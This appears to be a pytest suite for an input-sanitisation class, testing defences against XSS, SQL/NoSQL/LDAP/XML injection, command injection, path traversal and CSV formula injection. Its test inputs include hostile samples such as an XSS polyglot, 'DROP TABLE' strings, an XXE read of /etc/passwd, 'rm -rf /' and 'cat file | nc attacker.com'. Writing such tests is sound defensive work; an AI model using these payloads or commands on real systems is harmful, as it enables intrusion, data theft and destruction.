"""
Comprehensive test suite for Input Sanitizer FSA.

This test module provides 45 comprehensive tests covering:
- HTML sanitization (script tags, event handlers, iframes)
- JavaScript sanitization
- CSS sanitization
- SQL injection prevention
- NoSQL injection prevention
- LDAP injection prevention
- XML injection prevention
- Command injection prevention
- Path traversal prevention
- URL sanitization
- Email sanitization
- Filename sanitization
- Unicode normalization
- Context-aware sanitization
- XSS pattern detection
- Trusted Types validation
- Real-world attack scenarios
- Edge cases and performance

Author: MLA Framework Team
License: MIT
"""

import pytest
import os
import tempfile
from pathlib import Path
from typing import Dict, Any, List

from agno.fsas.security.input_sanitizer_fsa import (
    InputSanitizerFSA,
    SanitizationContext,
    SanitizationLevel,
    AttackPattern
)


class TestInputSanitizerFSABasics:
    """Test basic functionality and initialization."""

    def test_initialization_default(self):
        """Test FSA initialization with default parameters."""
        fsa = InputSanitizerFSA()

        assert fsa.name == "InputSanitizerFSA"
        assert fsa.sanitization_level == SanitizationLevel.STRICT
        assert fsa.encoding == "utf-8"
        assert fsa.max_input_length == 1000000
        assert fsa.unicode_normalization_form == "NFC"
        assert fsa.trusted_types_enabled is True
        assert len(fsa.allowed_html_tags) > 0
        assert len(fsa.allowed_protocols) > 0

    def test_initialization_custom(self):
        """Test FSA initialization with custom parameters."""
        custom_tags = {'div', 'span', 'p'}
        custom_protocols = {'https', 'mailto'}

        fsa = InputSanitizerFSA(
            name="CustomSanitizer",
            sanitization_level=SanitizationLevel.MODERATE,
            allowed_html_tags=custom_tags,
            allowed_protocols=custom_protocols,
            max_input_length=50000
        )

        assert fsa.name == "CustomSanitizer"
        assert fsa.sanitization_level == SanitizationLevel.MODERATE
        assert fsa.allowed_html_tags == custom_tags
        assert fsa.allowed_protocols == custom_protocols
        assert fsa.max_input_length == 50000

    def test_validation_success(self):
        """Test successful FSA validation."""
        fsa = InputSanitizerFSA()
        assert fsa.validate() is True

    def test_validation_failure_invalid_normalization(self):
        """Test validation failure with invalid Unicode normalization."""
        fsa = InputSanitizerFSA()
        fsa.unicode_normalization_form = "INVALID"
        assert fsa.validate() is False


class TestHTMLSanitization:
    """Test HTML sanitization functionality."""

    def test_sanitize_html_script_tags(self):
        """Test removal of script tags."""
        fsa = InputSanitizerFSA()

        malicious_html = '<p>Hello</p><script>alert("XSS")</script><p>World</p>'
        sanitized = fsa.sanitize_html(malicious_html)

        assert '<script>' not in sanitized.lower()
        assert 'alert' not in sanitized.lower()
        assert 'Hello' in sanitized
        assert 'World' in sanitized

    def test_sanitize_html_event_handlers(self):
        """Test removal of event handler attributes."""
        fsa = InputSanitizerFSA()

        malicious_html = '<img src="x" onerror="alert(1)">'
        sanitized = fsa.sanitize_html(malicious_html)

        assert 'onerror' not in sanitized.lower()
        assert 'alert' not in sanitized.lower()

    def test_sanitize_html_iframe_removal(self):
        """Test removal of iframe tags."""
        fsa = InputSanitizerFSA()

        malicious_html = '<p>Content</p><iframe src="evil.com"></iframe>'
        sanitized = fsa.sanitize_html(malicious_html)

        assert '<iframe' not in sanitized.lower()
        assert 'evil.com' not in sanitized.lower()

    def test_sanitize_html_javascript_protocol(self):
        """Test removal of javascript: protocol in URLs."""
        fsa = InputSanitizerFSA()

        malicious_html = '<a href="javascript:alert(1)">Click</a>'
        sanitized = fsa.sanitize_html(malicious_html)

        assert 'javascript:' not in sanitized.lower()

    def test_sanitize_html_allowed_tags_only(self):
        """Test that only allowed tags are preserved."""
        fsa = InputSanitizerFSA()

        html = '<p>Paragraph</p><form><input type="text"></form>'
        sanitized = fsa.sanitize_html(html, allowed_tags=['p'])

        assert '<p>' in sanitized
        assert '<form>' not in sanitized.lower()
        assert '<input>' not in sanitized.lower()

    def test_strip_dangerous_attributes(self):
        """Test removal of dangerous attributes."""
        fsa = InputSanitizerFSA()

        html = '<div onclick="malicious()" onload="bad()">Content</div>'
        sanitized = fsa.strip_dangerous_attributes(html)

        assert 'onclick' not in sanitized.lower()
        assert 'onload' not in sanitized.lower()

    def test_neutralize_scripts(self):
        """Test script neutralization."""
        fsa = InputSanitizerFSA()

        html = '<p>Safe</p><script>alert(1)</script><p>Content</p>'
        neutralized = fsa.neutralize_scripts(html)

        assert '<script>' not in neutralized.lower()


class TestJavaScriptSanitization:
    """Test JavaScript sanitization functionality."""

    def test_sanitize_javascript_eval_removal(self):
        """Test removal of eval() calls."""
        fsa = InputSanitizerFSA()

        js_code = 'var x = 10; eval("malicious code"); console.log(x);'
        sanitized = fsa.sanitize_javascript(js_code)

        assert 'eval' not in sanitized or '/* eval removed */' in sanitized

    def test_sanitize_javascript_function_constructor(self):
        """Test removal of Function() constructor."""
        fsa = InputSanitizerFSA()

        js_code = 'var f = new Function("alert", "alert(1)");'
        sanitized = fsa.sanitize_javascript(js_code)

        assert 'new Function' not in sanitized or '/* Function constructor removed */' in sanitized

    def test_sanitize_javascript_document_write(self):
        """Test removal of document.write()."""
        fsa = InputSanitizerFSA()

        js_code = 'document.write("<script>alert(1)</script>");'
        sanitized = fsa.sanitize_javascript(js_code)

        assert 'document.write' not in sanitized or '/* document.write removed */' in sanitized

    def test_sanitize_javascript_innerhtml_conversion(self):
        """Test conversion of innerHTML to textContent."""
        fsa = InputSanitizerFSA()

        js_code = 'element.innerHTML = userInput;'
        sanitized = fsa.sanitize_javascript(js_code)

        assert '.textContent' in sanitized or 'innerHTML' not in sanitized


class TestCSSSanitization:
    """Test CSS sanitization functionality."""

    def test_sanitize_css_expression_removal(self):
        """Test removal of CSS expression()."""
        fsa = InputSanitizerFSA()

        css_code = 'width: expression(alert("XSS"));'
        sanitized = fsa.sanitize_css(css_code)

        assert 'expression' not in sanitized or '/* expression removed */' in sanitized

    def test_sanitize_css_import_removal(self):
        """Test removal of @import rules."""
        fsa = InputSanitizerFSA()

        css_code = '@import url("evil.css"); body { color: red; }'
        sanitized = fsa.sanitize_css(css_code)

        assert '@import' not in sanitized or '/* @import removed */' in sanitized

    def test_sanitize_css_behavior_removal(self):
        """Test removal of behavior property."""
        fsa = InputSanitizerFSA()

        css_code = 'behavior: url(xss.htc);'
        sanitized = fsa.sanitize_css(css_code)

        assert 'behavior' not in sanitized or '/* behavior removed */' in sanitized

    def test_sanitize_css_javascript_url(self):
        """Test removal of javascript: in url()."""
        fsa = InputSanitizerFSA()

        css_code = 'background: url(javascript:alert(1));'
        sanitized = fsa.sanitize_css(css_code)

        assert 'javascript:' not in sanitized.lower()


class TestSQLInjectionPrevention:
    """Test SQL injection prevention."""

    def test_sanitize_sql_quotes_escaping(self):
        """Test escaping of single quotes."""
        fsa = InputSanitizerFSA()

        sql_input = "O'Reilly"
        sanitized = fsa.sanitize_sql(sql_input)

        assert "''" in sanitized or "O''Reilly" in sanitized

    def test_sanitize_sql_comment_removal(self):
        """Test removal of SQL comments."""
        fsa = InputSanitizerFSA()

        sql_input = "admin' -- comment"
        sanitized = fsa.sanitize_sql(sql_input)

        assert '--' not in sanitized

    def test_sanitize_sql_union_detection(self):
        """Test detection of UNION attacks."""
        fsa = InputSanitizerFSA()

        sql_input = "' UNION SELECT password FROM users--"
        patterns = fsa.detect_sql_injection_patterns(sql_input)

        assert len(patterns) > 0
        assert any('UNION' in str(p).upper() for p in patterns)

    def test_sanitize_sql_semicolon_removal(self):
        """Test removal of semicolons to prevent query chaining."""
        fsa = InputSanitizerFSA()

        sql_input = "admin'; DROP TABLE users;--"
        sanitized = fsa.sanitize_sql(sql_input)

        assert ';' not in sanitized

    def test_detect_sql_injection_patterns(self):
        """Test SQL injection pattern detection."""
        fsa = InputSanitizerFSA()

        malicious_inputs = [
            "' OR '1'='1",
            "admin'--",
            "1 UNION SELECT * FROM users",
            "'; DROP TABLE users;--"
        ]

        for sql_input in malicious_inputs:
            patterns = fsa.detect_sql_injection_patterns(sql_input)
            assert len(patterns) > 0


class TestNoSQLInjectionPrevention:
    """Test NoSQL injection prevention."""

    def test_sanitize_nosql_where_operator(self):
        """Test blocking of $where operator."""
        fsa = InputSanitizerFSA()

        query = {'$where': 'this.password == "secret"'}
        sanitized = fsa.sanitize_nosql(query)

        assert '$where' not in sanitized

    def test_sanitize_nosql_regex_operator(self):
        """Test blocking of $regex operator."""
        fsa = InputSanitizerFSA()

        query = {'username': {'$regex': '.*'}}
        sanitized = fsa.sanitize_nosql(query)

        assert '$regex' not in sanitized

    def test_sanitize_nosql_nested_query(self):
        """Test recursive sanitization of nested queries."""
        fsa = InputSanitizerFSA()

        query = {
            'user': 'admin',
            'filter': {
                '$where': 'malicious code',
                'status': 'active'
            }
        }
        sanitized = fsa.sanitize_nosql(query)

        assert '$where' not in str(sanitized)
        assert 'user' in sanitized
        assert 'status' in sanitized.get('filter', {})


class TestLDAPInjectionPrevention:
    """Test LDAP injection prevention."""

    def test_sanitize_ldap_wildcard_escaping(self):
        """Test escaping of wildcard characters."""
        fsa = InputSanitizerFSA()

        ldap_filter = 'user*'
        sanitized = fsa.sanitize_ldap(ldap_filter)

        assert '\\2a' in sanitized  # Escaped asterisk

    def test_sanitize_ldap_parentheses_escaping(self):
        """Test escaping of parentheses."""
        fsa = InputSanitizerFSA()

        ldap_filter = '(cn=admin)'
        sanitized = fsa.sanitize_ldap(ldap_filter)

        assert '\\28' in sanitized  # Escaped (
        assert '\\29' in sanitized  # Escaped )

    def test_sanitize_ldap_null_byte_escaping(self):
        """Test escaping of null bytes."""
        fsa = InputSanitizerFSA()

        ldap_filter = 'user\x00admin'
        sanitized = fsa.sanitize_ldap(ldap_filter)

        assert '\\00' in sanitized


class TestXMLInjectionPrevention:
    """Test XML injection prevention."""

    def test_sanitize_xml_entity_removal(self):
        """Test removal of entity declarations."""
        fsa = InputSanitizerFSA()

        xml_input = '<!ENTITY xxe SYSTEM "file:///etc/passwd">test'
        sanitized = fsa.sanitize_xml(xml_input)

        assert '<!ENTITY' not in sanitized

    def test_sanitize_xml_doctype_removal(self):
        """Test removal of DOCTYPE declarations."""
        fsa = InputSanitizerFSA()

        xml_input = '<!DOCTYPE foo [<!ENTITY xxe "bar">]><root>test</root>'
        sanitized = fsa.sanitize_xml(xml_input)

        assert '<!DOCTYPE' not in sanitized

    def test_sanitize_xml_special_characters(self):
        """Test escaping of XML special characters."""
        fsa = InputSanitizerFSA()

        xml_input = '<tag>Value & "quoted"</tag>'
        sanitized = fsa.sanitize_xml(xml_input)

        assert '&amp;' in sanitized
        assert '&lt;' in sanitized or '&gt;' in sanitized


class TestCommandInjectionPrevention:
    """Test command injection prevention."""

    def test_prevent_command_injection_semicolon(self):
        """Test removal of semicolons."""
        fsa = InputSanitizerFSA()

        command = 'ls; rm -rf /'
        sanitized = fsa.prevent_command_injection(command)

        assert ';' not in sanitized

    def test_prevent_command_injection_pipe(self):
        """Test removal of pipes."""
        fsa = InputSanitizerFSA()

        command = 'cat file | nc attacker.com'
        sanitized = fsa.prevent_command_injection(command)

        assert '|' not in sanitized

    def test_prevent_command_injection_backticks(self):
        """Test removal of command substitution."""
        fsa = InputSanitizerFSA()

        command = 'echo `whoami`'
        sanitized = fsa.prevent_command_injection(command)

        assert '`' not in sanitized

    def test_prevent_command_injection_dollar_paren(self):
        """Test removal of $() substitution."""
        fsa = InputSanitizerFSA()

        command = 'echo $(pwd)'
        sanitized = fsa.prevent_command_injection(command)

        assert '$(' not in sanitized


class TestPathTraversalPrevention:
    """Test path traversal prevention."""

    def test_sanitize_path_double_dots(self):
        """Test blocking of ../ sequences."""
        fsa = InputSanitizerFSA()

        with tempfile.TemporaryDirectory() as tmpdir:
            malicious_path = '../../etc/passwd'

            with pytest.raises(ValueError):
                fsa.sanitize_path(malicious_path, tmpdir)

    def test_sanitize_path_absolute_prevention(self):
        """Test prevention of absolute path access."""
        fsa = InputSanitizerFSA()

        with tempfile.TemporaryDirectory() as tmpdir:
            malicious_path = '/etc/passwd'

            with pytest.raises(ValueError):
                fsa.sanitize_path(malicious_path, tmpdir)

    def test_sanitize_path_safe_relative(self):
        """Test safe relative path handling."""
        fsa = InputSanitizerFSA()

        with tempfile.TemporaryDirectory() as tmpdir:
            safe_path = 'documents/file.txt'
            sanitized = fsa.sanitize_path(safe_path, tmpdir)

            assert tmpdir in sanitized
            assert 'documents' in sanitized


class TestURLSanitization:
    """Test URL sanitization functionality."""

    def test_sanitize_url_javascript_protocol(self):
        """Test blocking of javascript: protocol."""
        fsa = InputSanitizerFSA()

        malicious_url = 'javascript:alert(1)'
        sanitized = fsa.sanitize_url(malicious_url)

        assert sanitized == ""

    def test_sanitize_url_data_protocol(self):
        """Test blocking of data: protocol."""
        fsa = InputSanitizerFSA()

        malicious_url = 'data:text/html,<script>alert(1)</script>'
        sanitized = fsa.sanitize_url(malicious_url)

        assert sanitized == ""

    def test_sanitize_url_allowed_protocols(self):
        """Test allowance of safe protocols."""
        fsa = InputSanitizerFSA()

        safe_urls = [
            'https://example.com',
            'http://example.com',
            'mailto:user@example.com',
            'ftp://example.com/file.txt'
        ]

        for url in safe_urls:
            sanitized = fsa.sanitize_url(url)
            assert sanitized != ""

    def test_sanitize_url_encoding(self):
        """Test proper URL encoding."""
        fsa = InputSanitizerFSA()

        url = 'https://example.com/path with spaces'
        sanitized = fsa.sanitize_url(url)

        assert '%20' in sanitized or 'path%20with%20spaces' in sanitized


class TestEmailSanitization:
    """Test email sanitization functionality."""

    def test_sanitize_email_valid(self):
        """Test valid email addresses."""
        fsa = InputSanitizerFSA()

        valid_emails = [
            'user@example.com',
            'user.name@example.com',
            'user+tag@example.co.uk'
        ]

        for email in valid_emails:
            sanitized = fsa.sanitize_email(email)
            assert sanitized != ""
            assert '@' in sanitized

    def test_sanitize_email_invalid(self):
        """Test invalid email addresses."""
        fsa = InputSanitizerFSA()

        invalid_emails = [
            'not-an-email',
            '@example.com',
            'user@',
            'user space@example.com'
        ]

        for email in invalid_emails:
            sanitized = fsa.sanitize_email(email)
            assert sanitized == ""

    def test_sanitize_email_normalization(self):
        """Test email normalization to lowercase."""
        fsa = InputSanitizerFSA()

        email = 'User@EXAMPLE.COM'
        sanitized = fsa.sanitize_email(email)

        assert sanitized == 'user@example.com'


class TestFilenameSanitization:
    """Test filename sanitization functionality."""

    def test_sanitize_filename_path_separators(self):
        """Test removal of path separators."""
        fsa = InputSanitizerFSA()

        malicious_filename = '../../../etc/passwd'
        sanitized = fsa.sanitize_filename(malicious_filename)

        assert '/' not in sanitized
        assert '\\' not in sanitized

    def test_sanitize_filename_dangerous_characters(self):
        """Test removal of dangerous characters."""
        fsa = InputSanitizerFSA()

        malicious_filename = 'file<>:"|?*.txt'
        sanitized = fsa.sanitize_filename(malicious_filename)

        assert '<' not in sanitized
        assert '>' not in sanitized
        assert ':' not in sanitized
        assert '?' not in sanitized
        assert '*' not in sanitized

    def test_sanitize_filename_reserved_names(self):
        """Test handling of reserved Windows filenames."""
        fsa = InputSanitizerFSA()

        reserved_names = ['CON', 'PRN', 'AUX', 'NUL']

        for name in reserved_names:
            sanitized = fsa.sanitize_filename(name)
            assert sanitized != name  # Should be prefixed

    def test_sanitize_filename_length_limit(self):
        """Test filename length limiting."""
        fsa = InputSanitizerFSA()

        long_filename = 'a' * 300 + '.txt'
        sanitized = fsa.sanitize_filename(long_filename, max_length=255)

        assert len(sanitized) <= 255
        assert sanitized.endswith('.txt')


class TestUnicodeNormalization:
    """Test Unicode normalization functionality."""

    def test_normalize_unicode_nfc(self):
        """Test NFC normalization."""
        fsa = InputSanitizerFSA()

        # Combining characters
        text = 'e\u0301'  # e + combining acute accent
        normalized = fsa.normalize_unicode(text, 'NFC')

        assert len(normalized) == 1  # Should be composed

    def test_normalize_unicode_rtlo_removal(self):
        """Test RTLO character removal."""
        fsa = InputSanitizerFSA()

        text = 'file\u202etxt.exe'  # RTLO attack
        normalized = fsa.normalize_unicode(text)

        assert '\u202e' not in normalized

    def test_normalize_unicode_zero_width_removal(self):
        """Test zero-width character removal."""
        fsa = InputSanitizerFSA()

        text = 'test\u200bword'  # Zero-width space
        normalized = fsa.normalize_unicode(text)

        assert '\u200b' not in normalized

    def test_remove_control_characters(self):
        """Test control character removal."""
        fsa = InputSanitizerFSA()

        text = 'Hello\x00World\x01Test'
        cleaned = fsa.remove_control_characters(text)

        assert '\x00' not in cleaned
        assert '\x01' not in cleaned
        assert 'HelloWorldTest' == cleaned.replace(' ', '')


class TestWhitelistBlacklistSanitization:
    """Test whitelist and blacklist sanitization."""

    def test_sanitize_with_whitelist(self):
        """Test whitelist-based sanitization."""
        fsa = InputSanitizerFSA()

        input_data = 'abc123xyz'
        whitelist = ['a', 'b', 'c', '1', '2', '3']
        sanitized = fsa.sanitize_with_whitelist(input_data, whitelist)

        assert 'abc123' == sanitized
        assert 'xyz' not in sanitized

    def test_sanitize_with_blacklist(self):
        """Test blacklist-based sanitization."""
        fsa = InputSanitizerFSA()

        input_data = 'Hello<script>World'
        blacklist = ['<script>', '<', '>']
        sanitized = fsa.sanitize_with_blacklist(input_data, blacklist)

        assert '<' not in sanitized
        assert '>' not in sanitized


class TestXSSPatternDetection:
    """Test XSS pattern detection."""

    def test_detect_xss_patterns_script_tags(self):
        """Test detection of script tags."""
        fsa = InputSanitizerFSA()

        malicious_input = '<script>alert(1)</script>'
        patterns = fsa.detect_xss_patterns(malicious_input)

        assert len(patterns) > 0
        assert any('script' in str(p).lower() for p in patterns)

    def test_detect_xss_patterns_event_handlers(self):
        """Test detection of event handlers."""
        fsa = InputSanitizerFSA()

        malicious_input = '<img src=x onerror=alert(1)>'
        patterns = fsa.detect_xss_patterns(malicious_input)

        assert len(patterns) > 0

    def test_detect_xss_patterns_multiple(self):
        """Test detection of multiple XSS vectors."""
        fsa = InputSanitizerFSA()

        malicious_input = '<script>alert(1)</script><img onerror=alert(2)>'
        patterns = fsa.detect_xss_patterns(malicious_input)

        assert len(patterns) >= 2


class TestContextAwareSanitization:
    """Test context-aware sanitization."""

    def test_apply_context_aware_html(self):
        """Test HTML context sanitization."""
        fsa = InputSanitizerFSA()

        data = '<script>alert(1)</script>'
        sanitized = fsa.apply_context_aware_sanitization(data, 'html')

        assert '&lt;' in sanitized or '<script>' not in sanitized

    def test_apply_context_aware_javascript(self):
        """Test JavaScript context sanitization."""
        fsa = InputSanitizerFSA()

        data = 'Hello "World"'
        sanitized = fsa.apply_context_aware_sanitization(data, 'javascript')

        assert '\\"' in sanitized or '\\x' in sanitized

    def test_apply_context_aware_css(self):
        """Test CSS context sanitization."""
        fsa = InputSanitizerFSA()

        data = 'red'
        sanitized = fsa.apply_context_aware_sanitization(data, 'css')

        assert sanitized != ""

    def test_apply_context_aware_url(self):
        """Test URL context sanitization."""
        fsa = InputSanitizerFSA()

        data = 'hello world'
        sanitized = fsa.apply_context_aware_sanitization(data, 'url')

        assert '%20' in sanitized or 'hello%20world' in sanitized


class TestJSONSanitization:
    """Test JSON sanitization functionality."""

    def test_sanitize_json_nested(self):
        """Test recursive JSON sanitization."""
        fsa = InputSanitizerFSA()

        json_data = {
            'name': 'test\x00user',
            'nested': {
                'value': 'data\x01here'
            }
        }
        sanitized = fsa.sanitize_json(json_data)

        assert '\x00' not in str(sanitized)
        assert '\x01' not in str(sanitized)

    def test_sanitize_json_arrays(self):
        """Test JSON array sanitization."""
        fsa = InputSanitizerFSA()

        json_data = {
            'items': ['item1\x00', 'item2\x01', 'item3']
        }
        sanitized = fsa.sanitize_json(json_data)

        assert '\x00' not in str(sanitized['items'])
        assert '\x01' not in str(sanitized['items'])


class TestCSVSanitization:
    """Test CSV sanitization functionality."""

    def test_sanitize_csv_formula_injection(self):
        """Test prevention of CSV formula injection."""
        fsa = InputSanitizerFSA()

        csv_data = '=cmd|/c calc,normal,data\n+2+3,test,value'
        sanitized = fsa.sanitize_csv(csv_data)

        # Formulas should be prefixed with single quote
        lines = sanitized.split('\n')
        assert lines[0].startswith("'=") or "=" not in lines[0]

    def test_sanitize_csv_multiple_formulas(self):
        """Test sanitization of multiple formula types."""
        fsa = InputSanitizerFSA()

        csv_data = '=1+1,@SUM(A1:A10),-2+2,+cmd'
        sanitized = fsa.sanitize_csv(csv_data)

        # All formula starters should be escaped
        assert sanitized.count("'") >= 3


class TestMarkdownSanitization:
    """Test Markdown sanitization functionality."""

    def test_sanitize_markdown_html_removal(self):
        """Test removal of HTML from Markdown."""
        fsa = InputSanitizerFSA()

        markdown = '# Title\n<script>alert(1)</script>\nParagraph'
        sanitized = fsa.sanitize_markdown(markdown)

        assert '<script>' not in sanitized

    def test_sanitize_markdown_javascript_links(self):
        """Test removal of javascript: links."""
        fsa = InputSanitizerFSA()

        markdown = '[Click here](javascript:alert(1))'
        sanitized = fsa.sanitize_markdown(markdown)

        assert 'javascript:' not in sanitized.lower()

    def test_sanitize_markdown_data_uris(self):
        """Test removal of data: URIs."""
        fsa = InputSanitizerFSA()

        markdown = '![Image](data:text/html,<script>alert(1)</script>)'
        sanitized = fsa.sanitize_markdown(markdown)

        assert 'data:' not in sanitized.lower()


class TestEncodingFunctions:
    """Test various encoding functions."""

    def test_encode_for_javascript_context(self):
        """Test JavaScript context encoding."""
        fsa = InputSanitizerFSA()

        text = 'Hello "World"\n<script>'
        encoded = fsa.encode_for_javascript_context(text)

        assert '\\"' in encoded
        assert '\\n' in encoded
        assert '\\x3C' in encoded.lower() or '\\x3c' in encoded.lower()

    def test_encode_for_css_context(self):
        """Test CSS context encoding."""
        fsa = InputSanitizerFSA()

        text = 'red; expression(alert(1))'
        encoded = fsa.encode_for_css_context(text)

        # Should be hex-encoded
        assert '\\' in encoded

    def test_encode_for_url_context(self):
        """Test URL context encoding."""
        fsa = InputSanitizerFSA()

        text = 'hello world & stuff'
        encoded = fsa.encode_for_url_context(text)

        assert '%20' in encoded
        assert '%26' in encoded

    def test_escape_html_entities(self):
        """Test HTML entity escaping."""
        fsa = InputSanitizerFSA()

        text = '<script>alert("XSS")</script>'
        escaped = fsa.escape_html_entities(text)

        assert '&lt;' in escaped
        assert '&gt;' in escaped
        assert '&quot;' in escaped

    def test_unescape_html_entities(self):
        """Test HTML entity unescaping."""
        fsa = InputSanitizerFSA()

        text = '&lt;div&gt;Hello &amp; World&lt;/div&gt;'
        unescaped = fsa.unescape_html_entities(text)

        assert '<div>' in unescaped
        assert '&' in unescaped


class TestCSPandTrustedTypes:
    """Test CSP and Trusted Types functionality."""

    def test_implement_csp_rules(self):
        """Test CSP rule generation."""
        fsa = InputSanitizerFSA()

        csp_header = fsa.implement_csp_rules("")

        assert 'default-src' in csp_header
        assert 'script-src' in csp_header
        assert "'self'" in csp_header

    def test_validate_trusted_types_safe(self):
        """Test Trusted Types validation with safe input."""
        fsa = InputSanitizerFSA()

        safe_input = 'Hello World'
        assert fsa.validate_trusted_types(safe_input) is True

    def test_validate_trusted_types_dangerous(self):
        """Test Trusted Types validation with dangerous input."""
        fsa = InputSanitizerFSA()

        dangerous_input = '<script>alert(1)</script>'
        assert fsa.validate_trusted_types(dangerous_input) is False


class TestMIMETypeSanitization:
    """Test MIME type sanitization."""

    def test_sanitize_mime_type_safe(self):
        """Test sanitization of safe MIME types."""
        fsa = InputSanitizerFSA()

        safe_types = [
            'text/plain',
            'application/json',
            'image/png',
            'application/pdf'
        ]

        for mime_type in safe_types:
            sanitized = fsa.sanitize_mime_type(mime_type)
            assert sanitized == mime_type

    def test_sanitize_mime_type_unsafe(self):
        """Test sanitization of unsafe MIME types."""
        fsa = InputSanitizerFSA()

        unsafe_type = 'application/x-custom-evil'
        sanitized = fsa.sanitize_mime_type(unsafe_type)

        assert sanitized == 'application/octet-stream'

    def test_sanitize_mime_type_with_parameters(self):
        """Test MIME type sanitization with parameters."""
        fsa = InputSanitizerFSA()

        mime_type = 'text/html; charset=utf-8'
        sanitized = fsa.sanitize_mime_type(mime_type)

        assert sanitized == 'text/html'


class TestMetricsAndErrorHandling:
    """Test metrics tracking and error handling."""

    def test_metrics_tracking(self):
        """Test that metrics are tracked correctly."""
        fsa = InputSanitizerFSA()

        # Perform some sanitizations
        fsa.sanitize_html('<script>alert(1)</script>')
        fsa.sanitize_sql("' OR 1=1--")

        metrics = fsa.get_metrics()

        assert metrics['total_sanitizations'] >= 2
        assert metrics['xss_detections'] >= 1
        assert metrics['sql_injection_detections'] >= 1

    def test_metrics_reset(self):
        """Test metrics reset functionality."""
        fsa = InputSanitizerFSA()

        fsa.sanitize_html('<script>test</script>')
        fsa.reset_metrics()

        metrics = fsa.get_metrics()
        assert metrics['total_sanitizations'] == 0
        assert metrics['xss_detections'] == 0

    def test_error_handling(self):
        """Test error handling mechanism."""
        fsa = InputSanitizerFSA()

        exception = ValueError("Test error")
        error_info = fsa.error_handling(exception)

        assert 'error' in error_info
        assert 'error_type' in error_info
        assert error_info['error_type'] == 'ValueError'

    def test_execute_with_max_length_exceeded(self):
        """Test execution with input exceeding max length."""
        fsa = InputSanitizerFSA(max_input_length=100)

        long_input = 'a' * 200

        result = fsa.execute(long_input, 'plain_text')

        # Should return error info
        assert isinstance(result, dict)
        assert 'error' in result


class TestRealWorldScenarios:
    """Test real-world attack scenarios."""

    def test_polyglot_attack(self):
        """Test protection against polyglot attacks."""
        fsa = InputSanitizerFSA()

        polyglot = 'jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//'

        sanitized_html = fsa.sanitize_html(polyglot)
        sanitized_js = fsa.sanitize_javascript(polyglot)

        assert 'alert' not in sanitized_html.lower() or 'onclick' not in sanitized_html.lower()

    def test_mutation_xss_prevention(self):
        """Test protection against mutation XSS (mXSS)."""
        fsa = InputSanitizerFSA()

        mxss = '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'
        sanitized = fsa.sanitize_html(mxss)

        assert '<img' not in sanitized.lower() or 'onerror' not in sanitized.lower()

    def test_dom_based_xss_prevention(self):
        """Test protection against DOM-based XSS vectors."""
        fsa = InputSanitizerFSA()

        dom_xss = 'data:text/html,<script>alert(document.domain)</script>'
        sanitized = fsa.sanitize_url(dom_xss)

        assert sanitized == ""

    def test_homograph_attack_prevention(self):
        """Test protection against Unicode homograph attacks."""
        fsa = InputSanitizerFSA()

        # Using Cyrillic 'а' instead of Latin 'a'
        homograph = 'pаypal.com'  # Contains Cyrillic 'а'
        normalized = fsa.normalize_unicode(homograph)

        # Should be normalized
        assert normalized is not None

    def test_complex_nested_attack(self):
        """Test protection against complex nested attacks."""
        fsa = InputSanitizerFSA()

        nested = '<div><p><span><script>alert(1)</script></span></p></div>'
        sanitized = fsa.sanitize_html(nested)

        assert '<script>' not in sanitized.lower()

    def test_concurrent_sanitization(self):
        """Test handling of concurrent sanitization requests."""
        fsa = InputSanitizerFSA()

        inputs = [
            '<script>alert(1)</script>',
            "' OR 1=1--",
            'javascript:alert(1)',
            '../../../etc/passwd',
            '=cmd|/c calc'
        ]

        results = []
        for input_data in inputs:
            result = fsa.execute(input_data, 'html')
            results.append(result)

        # All should be sanitized
        assert len(results) == len(inputs)
        assert all(r is not None for r in results)


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_empty_input(self):
        """Test handling of empty input."""
        fsa = InputSanitizerFSA()

        assert fsa.sanitize_html("") == ""
        assert fsa.sanitize_sql("") == ""
        assert fsa.sanitize_url("") == ""

    def test_none_input(self):
        """Test handling of None input."""
        fsa = InputSanitizerFSA()

        assert fsa.sanitize_html(None) == ""
        assert fsa.sanitize_javascript(None) == ""
        assert fsa.sanitize_css(None) == ""

    def test_numeric_input_conversion(self):
        """Test handling of numeric input."""
        fsa = InputSanitizerFSA()

        result = fsa.execute(12345, 'plain_text')
        assert result is not None

    def test_very_long_input(self):
        """Test handling of very long input within limits."""
        fsa = InputSanitizerFSA(max_input_length=1000000)

        long_input = 'a' * 500000
        result = fsa.execute(long_input, 'plain_text')

        assert result is not None

    def test_unicode_edge_cases(self):
        """Test Unicode edge cases."""
        fsa = InputSanitizerFSA()

        # Emoji and special Unicode
        text = '😀🎉🚀 Unicode test 中文 العربية'
        normalized = fsa.normalize_unicode(text)

        assert normalized is not None
        assert len(normalized) > 0


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
